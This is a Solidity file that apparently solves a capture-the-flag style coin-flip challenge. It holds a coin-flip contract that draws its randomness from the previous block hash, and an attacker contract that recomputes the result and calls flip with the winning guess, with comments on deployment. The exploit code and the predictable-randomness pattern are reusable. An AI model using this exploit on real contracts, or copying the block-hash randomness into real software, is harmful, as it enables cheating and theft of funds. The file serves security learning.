pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// New contract:
// Calculates the winner side and calls flip on original contract, with winner side
// (Deployment using remix - 10 consecutive calls to flip(<original address>) each 15 sec.)
pragma solidity ^0.4.18;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}

contract CoinFlipWinner {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function CoinFlipWinner() public {
        consecutiveWins = 0;
    }

    function flip(address _coinflip) public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        CoinFlip cf = CoinFlip(_coinflip);
        cf.flip(side);
        
        consecutiveWins++;
    }
}